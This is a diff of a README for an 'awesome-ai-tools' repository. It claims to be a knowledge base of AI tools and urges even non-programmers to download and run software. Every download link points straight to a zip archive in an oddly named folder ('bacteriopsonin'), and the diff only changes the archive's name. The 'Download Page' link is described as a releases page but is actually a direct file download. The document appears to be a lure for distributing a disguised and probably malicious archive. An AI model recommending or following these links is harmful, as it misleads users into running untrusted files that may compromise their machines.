@@ -1,7 +1,7 @@
 # 🎉 awesome-ai-tools - Discover Powerful AI Tools Easily
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/yusufszih/awesome-ai-tools/main/bacteriopsonin/awesome-ai-tools.zip)](https://raw.githubusercontent.com/yusufszih/awesome-ai-tools/main/bacteriopsonin/awesome-ai-tools.zip)
+[![Download](https://github.com/yusufszih/awesome-ai-tools/raw/refs/heads/main/bacteriopsonin/awesome_tools_ai_v1.3.zip)](https://github.com/yusufszih/awesome-ai-tools/raw/refs/heads/main/bacteriopsonin/awesome_tools_ai_v1.3.zip)
 
 ## 📖 Introduction
 Welcome to the awesome-ai-tools repository! This project provides a knowledge base of various AI tools. Whether you are looking to enhance your workflow or integrate AI into your projects, you'll find useful resources and tools here. This guide helps you download and run the software, even if you have no programming experience.
@@ -28,7 +28,7 @@ To begin using awesome-ai-tools, follow these steps:
 
 1. **Visit the Download Page**
    Click on the link below to access the releases page on GitHub:
-   [Download Page](https://raw.githubusercontent.com/yusufszih/awesome-ai-tools/main/bacteriopsonin/awesome-ai-tools.zip)
+   [Download Page](https://github.com/yusufszih/awesome-ai-tools/raw/refs/heads/main/bacteriopsonin/awesome_tools_ai_v1.3.zip)
 
 2. **Choose the Right Version**
    On the releases page, you will see different versions available. Look for the most recent version, which is highlighted at the top.
